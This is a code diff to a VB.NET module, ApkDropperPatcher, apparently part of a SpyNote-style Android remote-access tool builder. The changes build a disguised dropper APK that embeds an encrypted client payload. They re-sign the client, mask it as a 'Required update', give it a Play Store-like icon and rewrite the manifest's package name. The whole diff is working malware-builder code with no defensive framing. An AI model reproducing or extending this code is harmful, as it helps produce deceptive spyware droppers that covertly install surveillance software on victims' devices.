@@ -84,7 +84,9 @@ Public Module ApkDropperPatcher
         report.PublishedClientPath = publishedClient
 
         Dim payloadUrl As String = If(cfg.PayloadUrl, String.Empty).Trim()
-        If String.IsNullOrWhiteSpace(payloadUrl) Then
+        If cfg.EmbedPayload Then
+            payloadUrl = String.Empty
+        ElseIf String.IsNullOrWhiteSpace(payloadUrl) Then
             payloadUrl = "file:///" & publishedClient.Replace("\"c, "/"c)
         End If
         report.PayloadUrl = payloadUrl
@@ -95,8 +97,9 @@ Public Module ApkDropperPatcher
         Dim payloadAppName As String = If(String.IsNullOrWhiteSpace(cfg.PayloadAppName), "Required update", cfg.PayloadAppName.Trim())
         report.DropperPackage = dropperPackage
 
-        Dim workRoot As String = Path.Combine(resourcesPath, "Dropper", "_work")
+        Dim workRoot As String = Path.Combine(ApkNotifyPatcher.GetBuildingApktoolRoot(), "dropper_work")
         Dim decodeDir As String = Path.Combine(workRoot, "decoded")
+        Dim buildRoot As String = ApkNotifyPatcher.GetBuildingApktoolRoot()
         If Directory.Exists(workRoot) Then
             Try
                 Directory.Delete(workRoot, True)
@@ -105,12 +108,29 @@ Public Module ApkDropperPatcher
         End If
         Directory.CreateDirectory(workRoot)
 
+        Dim embedClientApk As String = clientApk
+        If Not ApkNotifyPatcher.ApkLooksSigned(clientApk) Then
+            Dim resignPath As String = Path.Combine(workRoot, "client_resigned.apk")
+            Dim resignErr As String = Nothing
+            If ApkNotifyPatcher.TrySignApkRobust(clientApk, resignPath, resourcesPath, resignErr) AndAlso ApkNotifyPatcher.ApkLooksSigned(resignPath) Then
+                embedClientApk = resignPath
+            Else
+                report.Errors.Add("Client APK is not signed — " & If(resignErr, "SignApk.jar / Java required"))
+                Return False
+            End If
+        End If
+
+        If String.IsNullOrWhiteSpace(cfg.ClientPackageName) Then
+            report.Errors.Add("Dropper: client package name is empty (Protection → Package Name)")
+            Return False
+        End If
+
         Dim shellDir As String = Path.Combine(payloadDir, "dropper_shell")
         Dim useTemplate As Boolean = Not String.IsNullOrWhiteSpace(cfg.TemplateApkPath) AndAlso File.Exists(cfg.TemplateApkPath)
 
         If useTemplate Then
             Dim decodeErr As String = Nothing
-            If Not ApkNotifyPatcher.RunBuildProcess("java", "-jar """ & apktoolJar & """ d -r """ & cfg.TemplateApkPath & """ -o """ & decodeDir & """ -f", payloadDir, decodeErr) Then
+            If Not ApkNotifyPatcher.DecodeApkPublic(apktoolJar, cfg.TemplateApkPath, decodeDir, payloadDir, decodeErr) Then
                 report.Errors.Add("Template decode failed: " & decodeErr)
                 Return False
             End If
@@ -122,16 +142,27 @@ Public Module ApkDropperPatcher
         End If
 
         CopyDropperSmali(decodeDir, payloadDir)
+        Dim publicXml As String = Path.Combine(decodeDir, "res", "values", "public.xml")
+        If File.Exists(publicXml) Then
+            Try
+                File.Delete(publicXml)
+            Catch
+            End Try
+        End If
         ApplyStyleResources(decodeDir, preset, dropperAppName, payloadAppName)
         PatchDropperManifest(decodeDir, dropperPackage, dropperAppName)
         EnsureDropperActivityInManifest(decodeDir)
-        WriteDropperAssets(decodeDir, cfg, clientApk, payloadUrl, dropperPackage)
+        WriteDropperAssets(decodeDir, cfg, embedClientApk, payloadUrl, dropperPackage)
+        If cfg.EmbedPayload AndAlso Not File.Exists(Path.Combine(decodeDir, "assets", "payload.apk")) Then
+            report.Errors.Add("Failed to embed client APK into dropper assets")
+            Return False
+        End If
         ApplyDropperIcon(decodeDir, cfg.IconPath, resourcesPath)
 
         Dim rebuiltPath As String = Path.Combine(workRoot, "dropper_unsigned.apk")
         Dim buildErr As String = Nothing
-        If Not ApkNotifyPatcher.RunBuildProcess("java", "-jar """ & apktoolJar & """ b -f -r """ & decodeDir & """ -o """ & rebuiltPath & """", payloadDir, buildErr) Then
-            report.Errors.Add("apktool build failed: " & buildErr)
+        If Not ApkNotifyPatcher.BuildDecodedApkPublic(apktoolJar, decodeDir, rebuiltPath, buildRoot, buildErr) Then
+            report.Errors.Add("apktool build failed: " & ApkNotifyPatcher.FormatApktoolError(buildErr))
             Return False
         End If
         If Not File.Exists(rebuiltPath) OrElse Not ApkNotifyPatcher.IsValidApkFile(rebuiltPath) Then
@@ -218,6 +249,7 @@ Public Module ApkDropperPatcher
         Dim text As String = File.ReadAllText(manifestPath, Encoding.UTF8)
         text = Regex.Replace(text, "package=""[^""]+""", "package=""" & EscapeXml(packageName) & """", RegexOptions.IgnoreCase)
         text = text.Replace("com.spynote.dropper.init", packageName & ".init")
+        text = text.Replace("com.spynote.dropper.file", packageName & ".dropper.file")
         If text.IndexOf("android:label", StringComparison.OrdinalIgnoreCase) < 0 Then
             text = text.Replace("<application ", "<application android:label=""" & EscapeXml(appName) & """ ")
         End If
@@ -248,9 +280,12 @@ Public Module ApkDropperPatcher
         Dim assetsDir As String = Path.Combine(decodeDir, "assets")
         Directory.CreateDirectory(assetsDir)
 
-        File.WriteAllText(Path.Combine(assetsDir, "payload_url.txt"), payloadUrl, New UTF8Encoding(False))
+        Dim clientPackage As String = If(String.IsNullOrWhiteSpace(cfg.ClientPackageName), dropperPackage, cfg.ClientPackageName.Trim())
+        File.WriteAllText(Path.Combine(assetsDir, "payload_url.txt"), If(payloadUrl, String.Empty), New UTF8Encoding(False))
         File.WriteAllText(Path.Combine(assetsDir, "app_mask.txt"), If(cfg.PayloadAppName, "Update"), New UTF8Encoding(False))
-        File.WriteAllText(Path.Combine(assetsDir, "key_package.txt"), If(cfg.ClientPackageName, dropperPackage), New UTF8Encoding(False))
+        File.WriteAllText(Path.Combine(assetsDir, "key_package.txt"), clientPackage, New UTF8Encoding(False))
+
+        If Not ApkNotifyPatcher.IsValidApkFile(clientApk) Then Return
 
         Dim clientBytes As Byte() = File.ReadAllBytes(clientApk)
         If cfg.EmbedPayload Then
@@ -277,6 +312,9 @@ Public Module ApkDropperPatcher
         If String.IsNullOrWhiteSpace(iconFile) OrElse Not File.Exists(iconFile) Then
             iconFile = Path.Combine(resourcesPath, "Icons", "devico", "gp.png")
         End If
+        If Not File.Exists(iconFile) Then
+            iconFile = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "Icons", "devico", "gp.png")
+        End If
         If Not File.Exists(iconFile) Then Return
 
         Dim densities As String() = {"mipmap-mdpi", "mipmap-hdpi", "mipmap-xhdpi", "mipmap-xxhdpi"}
@@ -285,6 +323,16 @@ Public Module ApkDropperPatcher
             Directory.CreateDirectory(dir)
             System.IO.File.Copy(iconFile, Path.Combine(dir, "ic_launcher.png"), True)
         Next
+
+        Dim manifestPath As String = Path.Combine(decodeDir, "AndroidManifest.xml")
+        If Not File.Exists(manifestPath) Then Return
+        Dim manifestText As String = File.ReadAllText(manifestPath, Encoding.UTF8)
+        If manifestText.IndexOf("android:icon=", StringComparison.OrdinalIgnoreCase) < 0 Then
+            manifestText = manifestText.Replace(
+                "<application android:allowBackup=""false""",
+                "<application android:allowBackup=""false"" android:icon=""@mipmap/ic_launcher""")
+            File.WriteAllText(manifestPath, manifestText, New UTF8Encoding(False))
+        End If
     End Sub
 
     Public Function EncryptPayloadBytes(data As Byte(), aesKey As Byte()) As Byte()
@@ -323,40 +371,16 @@ Public Module ApkDropperPatcher
     End Function
 
     Private Function TrySignDropperApk(apkPath As String, resourcesPath As String, ByRef errorMessage As String) As Boolean
-        errorMessage = Nothing
-        Try
-            Dim root As String = ApkNotifyPatcher.GetBuildingApktoolRoot()
-            Dim toolsErr As String = Nothing
-            ApkNotifyPatcher.EnsureSigningTools(resourcesPath, toolsErr)
-
-            Dim signJar As String = Directory.GetFiles(root, "SignApk.jar", SearchOption.AllDirectories).FirstOrDefault()
-            If String.IsNullOrWhiteSpace(signJar) Then signJar = Directory.GetFiles(root, "signapk.jar", SearchOption.AllDirectories).FirstOrDefault()
-            Dim cert As String = Directory.GetFiles(root, "certificate.pem", SearchOption.AllDirectories).FirstOrDefault()
-            Dim keyPk8 As String = Directory.GetFiles(root, "key.pk8", SearchOption.AllDirectories).FirstOrDefault()
-
-            If Not String.IsNullOrWhiteSpace(signJar) AndAlso Not String.IsNullOrWhiteSpace(cert) AndAlso Not String.IsNullOrWhiteSpace(keyPk8) Then
-                Dim signedTemp As String = apkPath & ".signed.tmp"
-                If File.Exists(signedTemp) Then File.Delete(signedTemp)
-                Dim signErr As String = Nothing
-                If ApkNotifyPatcher.RunBuildProcess("java", "-jar """ & signJar & """ """ & cert & """ """ & keyPk8 & """ """ & apkPath & """ """ & signedTemp & """", root, signErr, True) AndAlso ApkNotifyPatcher.IsValidApkFile(signedTemp) Then
-                    System.IO.File.Copy(signedTemp, apkPath, True)
-                    File.Delete(signedTemp)
-                    Return True
-                End If
-                errorMessage = signErr
-            End If
-
-            Dim keystorePath As String = Path.Combine(root, "dropper.keystore")
-            If ApkNotifyPatcher.TrySignApk(apkPath, keystorePath) AndAlso ApkNotifyPatcher.IsValidApkFile(apkPath) Then
-                Return True
-            End If
-
-            If String.IsNullOrWhiteSpace(errorMessage) Then errorMessage = If(toolsErr, "SignApk.jar not found")
-            Return False
-        Catch ex As Exception
-            errorMessage = ex.Message
-            Return False
-        End Try
+        Dim signedTemp As String = apkPath & ".signed.tmp"
+        If ApkNotifyPatcher.TrySignApkRobust(apkPath, signedTemp, resourcesPath, errorMessage) Then
+            System.IO.File.Copy(signedTemp, apkPath, True)
+            Try
+                File.Delete(signedTemp)
+            Catch
+            End Try
+            Return True
+        End If
+        Return False
     End Function
 
     Private Function EscapeXml(value As String) As String
